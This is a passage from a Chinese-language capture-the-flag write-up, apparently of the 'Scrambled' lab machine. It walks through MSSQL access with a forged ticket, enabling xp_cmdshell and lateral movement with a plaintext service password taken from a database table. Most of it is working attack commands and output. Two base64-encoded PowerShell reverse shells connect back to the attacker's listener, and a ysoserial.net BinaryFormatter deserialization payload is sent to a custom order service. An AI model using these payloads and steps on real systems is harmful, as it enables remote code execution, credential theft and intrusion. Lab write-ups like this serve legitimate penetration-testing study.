ticket</span><br><span class="line">[*]     PAC_SERVER_CHECKSUM</span><br><span class="line">[*]     PAC_PRIVSVR_CHECKSUM</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> administrator.ccache</span><br></pre></td></tr></table></figure>
<h3 id="logon-mssql-and-enum-and-reverse"><a href="#logon-mssql-and-enum-and-reverse" class="headerlink" title="logon mssql and enum and reverse"></a>logon mssql and enum and reverse</h3><p>通过银票看看能不能上mssql</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ mssqlclient.py dc1.scrm.local -k</span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC1): Line 1: Changed database context to <span class="string">&#x27;master&#x27;</span>.</span><br><span class="line">[*] INFO(DC1): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) </span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">SQL (SCRM\administrator  dbo@master)&gt; </span><br></pre></td></tr></table></figure>
<p>ok，got it<br>登了mssql，可以先看能不能打开xp_cmdshell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQL (SCRM\administrator  dbo@master)&gt; enable_xp_cmdshell;</span><br><span class="line">[*] INFO(DC1): Line 185: Configuration option <span class="string">&#x27;show advanced options&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">[*] INFO(DC1): Line 185: Configuration option <span class="string">&#x27;xp_cmdshell&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br></pre></td></tr></table></figure>
<p>意外之喜<br>反弹一下shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># target</span></span><br><span class="line">SQL (SCRM\administrator  dbo@master)&gt; xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAxACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==</span><br><span class="line"></span><br><span class="line"><span class="comment"># attacker</span></span><br><span class="line">$ rlwrap -cAr nc -lvnp 9001</span><br><span class="line">Listening on 0.0.0.0 9001</span><br><span class="line">Connection received on 10.10.11.168 55474</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">scrm\sqlsvc</span><br><span class="line">PS C:\Windows\system32&gt; </span><br></pre></td></tr></table></figure>
<p><img src="/images/scrambled-8.png"></p>
<h3 id="shell-as-sqlsvc"><a href="#shell-as-sqlsvc" class="headerlink" title="shell as sqlsvc"></a>shell as sqlsvc</h3><p>先看users下面都有啥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="line">----                -------------         ------ ----                                                                  </span><br><span class="line">d-----       05/11/2021     21:28                administrator                                                         </span><br><span class="line">d-----       03/11/2021     19:31                miscsvc                                                               </span><br><span class="line">d-r---       26/01/2020     17:54                Public                                                                </span><br><span class="line">d-----       01/06/2022     14:58                sqlsvc                                                                </span><br></pre></td></tr></table></figure>
<p>这里再回去翻一下数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">SQL (SCRM\administrator  dbo@master)&gt; enum_db;</span><br><span class="line">name         is_trustworthy_on   </span><br><span class="line">----------   -----------------   </span><br><span class="line">master                       0   </span><br><span class="line"></span><br><span class="line">tempdb                       0   </span><br><span class="line"></span><br><span class="line">model                        0   </span><br><span class="line"></span><br><span class="line">msdb                         1   </span><br><span class="line"></span><br><span class="line">ScrambleHR                   0   </span><br><span class="line"></span><br><span class="line">SQL (SCRM\administrator  dbo@ScrambleHR)&gt; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = <span class="string">&#x27;BASE TABLE&#x27;</span>;</span><br><span class="line">TABLE_NAME   </span><br><span class="line">----------   </span><br><span class="line">Employees    </span><br><span class="line"></span><br><span class="line">UserImport   </span><br><span class="line"></span><br><span class="line">Timesheets   </span><br><span class="line"></span><br><span class="line">SQL (SCRM\administrator  dbo@ScrambleHR)&gt; <span class="keyword">select</span> * from UserImport;</span><br><span class="line">LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   </span><br><span class="line">--------   -----------------   ----------   ---------------   -------------   </span><br><span class="line">MiscSvc    ScrambledEggs9900   scrm.local                90               0   </span><br></pre></td></tr></table></figure>
<p>有了miscsvc的密码，<br>弹一个shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\sqlsvc\desktop&gt; <span class="variable">$SecPassword</span> = ConvertTo-SecureString <span class="string">&#x27;ScrambledEggs9900&#x27;</span> -AsPlainText -Force</span><br><span class="line">PS C:\Users\sqlsvc\desktop&gt; <span class="variable">$Cred</span> = New-Object System.Management.Automation.PSCredential(<span class="string">&#x27;scrm.local\MiscSvc&#x27;</span>, <span class="variable">$SecPassword</span>)</span><br><span class="line">PS C:\Users\sqlsvc\desktop&gt; Invoke-Command -Computer 127.0.0.1 -Credential <span class="variable">$Cred</span> -ScriptBlock &#123; powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAxACIALAA5ADAAMAAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== &#125;</span><br><span class="line"></span><br><span class="line">$ rlwrap -cAr nc -lvnp 9002</span><br><span class="line">Listening on 0.0.0.0 9002</span><br><span class="line">Connection received on 10.10.11.168 55584</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">scrm\miscsvc</span><br><span class="line">PS C:\Users\miscsvc\Documents&gt; </span><br></pre></td></tr></table></figure>
<h2 id="shell-as-miscsvc"><a href="#shell-as-miscsvc" class="headerlink" title="shell as miscsvc"></a>shell as miscsvc</h2><p>看users下面，下一步应该就是administrator了（当然这种思想不对，应该仔细去想怎么横向，怎么枚举，怎么利用）<br>在C盘下面有一个shares目录<br>进去翻一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Shares&gt; <span class="built_in">cd</span> HR</span><br><span class="line">PS C:\Shares\HR&gt; <span class="built_in">dir</span></span><br><span class="line">PS C:\Shares\HR&gt; <span class="built_in">dir</span> -h</span><br><span class="line">PS C:\Shares\HR&gt; <span class="built_in">cd</span> ..</span><br><span class="line">PS C:\Shares&gt; <span class="built_in">cd</span> IT</span><br><span class="line">PS C:\Shares\IT&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Shares\IT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                              </span><br><span class="line">----                -------------         ------ ----                                              </span><br><span class="line">d-----       03/11/2021     21:06                Apps                                              </span><br><span class="line">d-----       03/11/2021     19:32                Logs                                              </span><br><span class="line">d-----       03/11/2021     19:32                Reports       </span><br><span class="line"></span><br><span class="line">PS C:\Shares\IT&gt; <span class="built_in">cd</span> Apps</span><br><span class="line">PS C:\Shares\IT\Apps&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Shares\IT\Apps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                              </span><br><span class="line">----                -------------         ------ ----                                              </span><br><span class="line">d-----       05/11/2021     20:57                Sales Order Client                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Shares\IT\Apps&gt; <span class="built_in">cd</span> <span class="string">&quot;Sales Order Client&quot;</span></span><br><span class="line">PS C:\Shares\IT\Apps\Sales Order Client&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Shares\IT\Apps\Sales Order Client</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                              </span><br><span class="line">----                -------------         ------ ----                                              </span><br><span class="line">-a----       05/11/2021     20:52          86528 ScrambleClient.exe                                </span><br><span class="line">-a----       05/11/2021     20:52          19456 ScrambleLib.dll   </span><br></pre></td></tr></table></figure>
<p>剩下两个文件夹倒是没有东西了，这个文件夹还是smb共享目录，那从smb下载吧<br>dnspy打开dll文件看看<br><img src="/images/scrambled-9.png"><br>如果勾选那个pdf中所说的enable log就会生成一个txt文件<br><img src="/images/scrambled-10.png"><br>然后可以通过<code>scrmdev</code>登录的话就可以不需要密码了<br><img src="/images/scrambled-11.png"><br>尝试了一下确实这个用户可以无密码登录，但是我的Windows虚拟机没有连接到vpn里面<br><img src="/images/scrambled-12.png"><br>wine打开，凑活看一下，记得勾选那个日志功能看日志<br><img src="/images/scrambled-13.png"><br>解一下看看<br><img src="/images/scrambled-14.png"><br>解个jb，应该是经过序列化编译的<br>接着翻反编译的吧<br>上图中的new order部分对应应该是<img src="/images/scrambled-15.png"><br>而uploadorder还在NewRequest部分被调用了<br><img src="/images/scrambled-16.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">// Token: 0x0600002D RID: 45 RVA: 0x000025C8 File Offset: 0x000007C8</span><br><span class="line">public void UploadOrder(SalesOrder NewOrder)</span><br><span class="line">&#123;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		Log.Write(<span class="string">&quot;Uploading new order with reference &quot;</span> + NewOrder.ReferenceNumber);</span><br><span class="line">		string text = NewOrder.SerializeToBase64();</span><br><span class="line">		Log.Write(<span class="string">&quot;Order serialized to base64: &quot;</span> + text);</span><br><span class="line">		ScrambleNetResponse scrambleNetResponse = this.SendRequestAndGetResponse(new ScrambleNetRequest(ScrambleNetRequest.RequestType.UploadOrder, text));</span><br><span class="line">		ScrambleNetResponse.ResponseType <span class="built_in">type</span> = scrambleNetResponse.Type;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">type</span> != ScrambleNetResponse.ResponseType.Success)</span><br><span class="line">		&#123;</span><br><span class="line">			throw new ApplicationException(scrambleNetResponse.GetErrorDescription());</span><br><span class="line">		&#125;</span><br><span class="line">		Log.Write(<span class="string">&quot;Upload successful&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	catch (Exception ex)</span><br><span class="line">	&#123;</span><br><span class="line">		Log.Write(<span class="string">&quot;Error: &quot;</span> + ex.Message);</span><br><span class="line">		throw ex;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  		// Token: 0x0600002E RID: 46 RVA: 0x00002664 File Offset: 0x00000864</span><br><span class="line">private ScrambleNetResponse SendRequestAndGetResponse(ScrambleNetRequest Request)</span><br><span class="line">&#123;</span><br><span class="line">	Log.Write(<span class="string">&quot;Connecting to server&quot;</span>);</span><br><span class="line">	TcpClient tcpClient = new TcpClient();</span><br><span class="line">	tcpClient.ReceiveTimeout = checked((int)Math.Round(TimeSpan.FromSeconds(<span class="number">20.0</span>).TotalMilliseconds));</span><br><span class="line">	tcpClient.ReceiveBufferSize = 2048;</span><br><span class="line">	tcpClient.SendBufferSize = 2048;</span><br><span class="line">	tcpClient.Connect(this.Server, this.Port);</span><br><span class="line">	ScrambleNetResponse result;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		using (NetworkStream stream = tcpClient.GetStream())</span><br><span class="line">		&#123;</span><br><span class="line">			using (StreamWriter streamWriter = new StreamWriter(stream, Encoding.ASCII))</span><br><span class="line">			&#123;</span><br><span class="line">				streamWriter.AutoFlush = <span class="literal">true</span>;</span><br><span class="line">				<span class="keyword">if</span> (this.GetResponse(stream).Type != ScrambleNetResponse.ResponseType.Banner)</span><br><span class="line">				&#123;</span><br><span class="line">					throw new ApplicationException(<span class="string">&quot;Unexpected response from server on initial connection&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				string text = ScrambleNetRequest.GetCodeFromMessageType(Request.Type) + <span class="string">&quot;;&quot;</span> + Request.Parameter + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">				Log.Write(<span class="string">&quot;Sending data to server: &quot;</span> + text);</span><br><span class="line">				streamWriter.Write(text);</span><br><span class="line">				Log.Write(<span class="string">&quot;Getting response from server&quot;</span>);</span><br><span class="line">				ScrambleNetResponse response = this.GetResponse(stream);</span><br><span class="line">				try</span><br><span class="line">				&#123;</span><br><span class="line">					byte[] bytes = Encoding.ASCII.GetBytes(<span class="string">&quot;QUIT\n&quot;</span>);</span><br><span class="line">					stream.Write(bytes, 0, bytes.Length);</span><br><span class="line">					stream.Close();</span><br><span class="line">				&#125;</span><br><span class="line">				catch (Exception ex)</span><br><span class="line">				&#123;</span><br><span class="line">					Log.Write(<span class="string">&quot;Error sending QUIT and closing stream: &quot;</span> + ex.Message);</span><br><span class="line">				&#125;</span><br><span class="line">				result = response;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	finally</span><br><span class="line">	&#123;</span><br><span class="line">		try</span><br><span class="line">		&#123;</span><br><span class="line">			tcpClient.Close();</span><br><span class="line">		&#125;</span><br><span class="line">		catch (Exception ex2)</span><br><span class="line">		&#123;</span><br><span class="line">			Log.Write(<span class="string">&quot;Error closing TCP connection: &quot;</span> + ex2.Message);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里会给4411端口发送序列化之后的数据，数据内容形式是<code>ScrambleNetRequest.GetCodeFromMessageType(Request.Type) + &quot;;&quot; + Request.Parameter + &quot;\n&quot;</code><br>再翻相关调用可以发现，发送内容是<code>UPLOAD_ORDER;&lt;序列化的内容&gt;</code>，应用程序又是.net，序列化就用到<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a>，这里我们用这个<a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net/releases/tag/v1.36">ysoserial.net</a><br>先生成一个测试的payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\liw\Downloads\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release&gt;.\ysoserial.exe -g DataSet -c <span class="string">&quot;cmd /c curl 10.10.16.11&quot;</span> -f BinaryFormatter -o <span class="built_in">base64</span></span><br><span class="line">AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAAKQDAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxgU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNtZCAvYyBjdXJsIDEwLjEwLjE2LjExIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsL</span><br><span class="line"></span><br><span class="line">$ nc 10.10.11.168 4411</span><br><span class="line">SCRAMBLECORP_ORDERS_V1.0.3;</span><br><span class="line">UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAAKQDAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxgU8P3htbCB2